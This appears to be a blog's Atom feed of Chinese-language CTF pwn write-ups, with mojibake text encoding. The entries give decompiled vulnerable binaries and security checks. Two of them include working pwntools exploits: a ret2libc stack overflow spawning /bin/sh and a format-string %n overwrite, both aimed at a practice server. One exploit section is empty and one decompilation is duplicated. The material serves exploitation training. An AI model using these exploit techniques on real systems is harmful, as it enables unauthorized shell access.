<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>EUREKA!</title>
  
  
  <link href="https://www.fomal.cc/atom.xml" rel="self"/>
  
  <link href="https://www.fomal.cc/"/>
  <updated>2023-04-09T06:24:30.169Z</updated>
  <id>https://www.fomal.cc/</id>
  
  <author>
    <name>EUREKAüçä</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ciscn_2019_ne_5</title>
    <link href="https://www.fomal.cc/posts/580985ae.html"/>
    <id>https://www.fomal.cc/posts/580985ae.html</id>
    <published>2023-04-09T06:25:05.476Z</published>
    <updated>2023-04-09T06:24:30.169Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÊëòË¶Å">ÊëòË¶Å</h2><h2 id="1-ÈÄÜÂêë">1.ÈÄÜÂêë</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">AddLog</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new log info:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, a1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">Display</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Print</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo Printing......&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">GetFlag</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+0h] [ebp-100h] BYREF</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">4</span>]; <span class="comment">// [esp+4h] [ebp-FCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">124</span>]; <span class="comment">// [esp+8h] [ebp-F8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">4</span>]; <span class="comment">// [esp+84h] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">96</span>]; <span class="comment">// [esp+88h] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="type">int</span> *p_argc; <span class="comment">// [esp+F4h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  p_argc = &amp;argc;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  *(_DWORD *)s1 = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  *(_DWORD *)src = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to use LFS.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input admin password:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%100s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;administrator&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your operation:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add a log.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Display all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Print all logs.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0.Exit\n:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      AddLog(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      Display(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      Print();</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      GetFlag(src);</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = sub_804892B(argc, argv, envp);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ÊºèÊ¥ûÂàÜÊûê">2.ÊºèÊ¥ûÂàÜÊûê</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="3-exploit">3.exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ÊëòË¶Å&quot;&gt;ÊëòË¶Å&lt;/h2&gt;
&lt;h2 id=&quot;1-ÈÄÜÂêë&quot;&gt;1.ÈÄÜÂêë&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;s</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_le vel3 WP</title>
    <link href="https://www.fomal.cc/posts/b1cdfc12.html"/>
    <id>https://www.fomal.cc/posts/b1cdfc12.html</id>
    <published>2023-04-09T06:25:05.466Z</published>
    <updated>2023-04-09T06:24:16.836Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÊëòË¶Å">ÊëòË¶Å</h2><p>Â∑Æ‰∏çÂ§öÁöÑÊ®°ÊùøÊáíÂæóÂÜôÂàÜÊûê‰∫Ü,Áõ¥Êé•Ë¥¥‰∏äexp,ËøôÈáåÂõ†‰∏∫‰∏§‰∏™LibcSearcherÁöÑÂéüÂõ†,‰∫ëÁ´ØÁöÑLibcSearcherÊâæ‰∏çÂà∞LibcÁâàÊú¨,‰ΩÜÊòØÊú¨Âú∞ÁöÑÁâàÊú¨ÂèàÂ§™Êóß‰∫Ü,ÊâÄ‰ª•ÊàëÁõ¥Êé•Êää‰∏§‰∏™ÁâàÊú¨Âà†‰∫ÜÈáçÊñ∞ÂÆâË£Ö‰∫ÜÁöÑÊú¨Âú∞LibcSearcher,ÊúÄÂêéÊÄªÁÆóÊâìÈÄö‰∫Üüò≠.</p><h2 id="1-ÈÄÜÂêë">1.ÈÄÜÂêë</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">256u</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">14u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ÊºèÊ¥ûÂàÜÊûê">2.ÊºèÊ¥ûÂàÜÊûê</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28812</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=<span class="number">0x8048484</span></span><br><span class="line">offset=<span class="number">0x88</span>+<span class="number">0x4</span></span><br><span class="line">ret=<span class="number">0x80482da</span></span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause(1)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=cyclic(offset)+p32(system)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_sh)</span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ÊëòË¶Å&quot;&gt;ÊëòË¶Å&lt;/h2&gt;
&lt;p&gt;Â∑Æ‰∏çÂ§öÁöÑÊ®°ÊùøÊáíÂæóÂÜôÂàÜÊûê‰∫Ü,Áõ¥Êé•Ë¥¥‰∏äexp,ËøôÈáåÂõ†‰∏∫‰∏§‰∏™LibcSearcherÁöÑÂéüÂõ†,‰∫ëÁ´ØÁöÑLibcSearcherÊâæ‰∏çÂà∞LibcÁâàÊú¨,‰ΩÜÊòØÊú¨Âú∞ÁöÑÁâàÊú¨ÂèàÂ§™Êóß‰∫Ü,ÊâÄ‰ª•ÊàëÁõ¥Êé•Êää‰∏§‰∏™ÁâàÊú¨Âà†‰∫ÜÈáçÊñ∞ÂÆâË£Ö‰∫ÜÁöÑÊú¨Âú∞LibcSearcher,ÊúÄÂêéÊÄªÁÆó</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_fm WP</title>
    <link href="https://www.fomal.cc/posts/c43912f5.html"/>
    <id>https://www.fomal.cc/posts/c43912f5.html</id>
    <published>2023-04-09T06:25:05.455Z</published>
    <updated>2023-04-09T06:24:05.430Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÊëòË¶Å">ÊëòË¶Å</h2><p>x86‰∏ãÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÁöÑÂàÜÊûêÂíåÂà©Áî®,Áü•ËØÜÁÇπË°•ÂÖÖÂú®‰∫ÜÁ¨îËÆ∞ÊñáÁ´†Èáå.</p><h2 id="1-ÈÄÜÂêë">1.ÈÄÜÂêë</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [esp+2Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">80u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d!\n&quot;</span>, x);</span><br><span class="line">  <span class="keyword">if</span> ( x == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;running sh...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ÊºèÊ¥ûÂàÜÊûê">2.ÊºèÊ¥ûÂàÜÊûê</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>ÊÉØ‰æãÊ£ÄÊü•‰∏Ä‰∏ãÂÆâÂÖ®Èò≤Êä§,Èô§‰∫ÜPIEÂá†‰πéÈÉΩÂÖ®ÂºÄ‰∫Ü,‰ΩÜÊòØÂèçÁºñËØëÁöÑ‰ª£Á†ÅÈáåÊúâÂæàÊòéÊòæÁöÑÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥û,ÈúÄË¶ÅÊàë‰ª¨‰øÆÊîπ.dataÊÆµ‰∏äÁöÑx‰∏∫4,Â∞±ÂèØ‰ª•Ë∞ÉÁî®shell‰∫Ü,Êàë‰ª¨ËæìÂÖ•‰∏Ä‰∏≤<code>%p</code>Êù•ÊâæÊâæÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤Êú¨‰ΩìÁöÑ‰ΩçÁΩÆ(‰∏çÊòØÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊåáÈíàÁöÑ‰ΩçÁΩÆ).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00:0000‚îÇ esp   0xffffcf90 ‚Äî‚ñ∏ 0xffffcfbc ‚óÇ‚Äî &#x27;%p%p%p%p%p%p\n&#x27;</span><br><span class="line">01:0004‚îÇ       0xffffcf94 ‚Äî‚ñ∏ 0xffffcfbc ‚óÇ‚Äî &#x27;%p%p%p%p%p%p\n&#x27;</span><br><span class="line">02:0008‚îÇ       0xffffcf98 ‚óÇ‚Äî 0x50 /* &#x27;P&#x27; */</span><br><span class="line">03:000c‚îÇ       0xffffcf9c ‚Äî‚ñ∏ 0xf7ffc7e0 (_rtld_global_ro) ‚óÇ‚Äî 0x0</span><br><span class="line">04:0010‚îÇ       0xffffcfa0 ‚óÇ‚Äî 0x0</span><br><span class="line">05:0014‚îÇ       0xffffcfa4 ‚óÇ‚Äî 0x0</span><br><span class="line">06:0018‚îÇ       0xffffcfa8 ‚Äî‚ñ∏ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ‚óÇ‚Äî 0x2bf24</span><br><span class="line">07:001c‚îÇ       0xffffcfac ‚Äî‚ñ∏ 0xffffd0b4 ‚Äî‚ñ∏ 0xffffd297 ‚óÇ‚Äî &#x27;/home/akira/Desktop/fm&#x27;</span><br><span class="line">08:0020‚îÇ       0xffffcfb0 ‚óÇ‚Äî 0x0</span><br><span class="line">09:0024‚îÇ       0xffffcfb4 ‚óÇ‚Äî 0x534</span><br><span class="line">0a:0028‚îÇ       0xffffcfb8 ‚óÇ‚Äî 0xd /* &#x27;\r&#x27; */</span><br><span class="line">0b:002c‚îÇ ebx   0xffffcfbc ‚óÇ‚Äî &#x27;%p%p%p%p%p%p\n&#x27;</span><br></pre></td></tr></table></figure><p>ÈÄöËøáË∞ÉËØïÂèëÁé∞0004Â§ÑÂ∞±ÊòØÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞,Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÊú¨‰ΩìÂú®002cÂ§Ñ,‰πüÂ∞±ÊòØÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÁ¨¨11‰∏™ÂèÇÊï∞,ÈÇ£‰πàÊàë‰ª¨ÊääË¶Å‰øÆÊîπÁöÑÂú∞ÂùÄÂ°´Âú®Á¨¨11‰∏™ÂèÇÊï∞Â§Ñ,ÁÑ∂ÂêéÂú®ÂêéÈù¢Êé•‰∏ä‰∏Ä‰∏™<code>%11$n</code>,Âõ†‰∏∫Âú∞ÂùÄÂàöÂ•ΩÊòØ4‰∏™Â≠óËäÇ,ÊâÄ‰ª•ÊàêÂäüÂêéÈù¢ÁöÑ<code>%11$n</code>‰ºöÊää4ÊâìÂç∞Âà∞Á¨¨11‰∏™ÂèÇÊï∞Â§ÑÂ≠òÊîæÁöÑÂú∞ÂùÄ‰∏≠,‰øÆÊîπÊàêÂäü.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28788</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./fm&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b main&#x27;)</span></span><br><span class="line">dest=<span class="number">0x804A02C</span></span><br><span class="line">payload=p32(dest)+<span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line"></span><br><span class="line">pause(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ÊëòË¶Å&quot;&gt;ÊëòË¶Å&lt;/h2&gt;
&lt;p&gt;x86‰∏ãÊ†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÁöÑÂàÜÊûêÂíåÂà©Áî®,Áü•ËØÜÁÇπË°•ÂÖÖÂú®‰∫ÜÁ¨îËÆ∞ÊñáÁ´†Èáå.&lt;/p&gt;
&lt;h2 id=&quot;1-ÈÄÜÂêë&quot;&gt;1.ÈÄÜÂêë&lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter</summary>
      
    
    
    
    <category term="È¢òËß£" scheme="https://www.fomal.cc/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>ciscn_2019_es_2 WP</title>
    <link href="https://www.fomal.cc/posts/ff0c2cc8.html"/>
    <id>https://www.fomal.cc/posts/ff0c2cc8.html</id>
    <published>2023-04-09T06:25:05.427Z</published>
    <updated>2023-04-09T06:23:26.749Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÊëòË¶Å">ÊëòË¶Å</h2><p>ËøôÈ¢òÊ∂âÂèäÂà∞‰∫ÜÊ†àÂä´ÊåÅÊìç‰Ωú,ÈöæÂ∫¶ÂºÄÂßãÈ´òËµ∑Êù•‰∫Ü.</p><h2 id="1-ÈÄÜÂêë">1.ÈÄÜÂêë</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ÊºèÊ¥ûÂàÜÊûê">2.ÊºèÊ¥ûÂàÜÊûê</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No 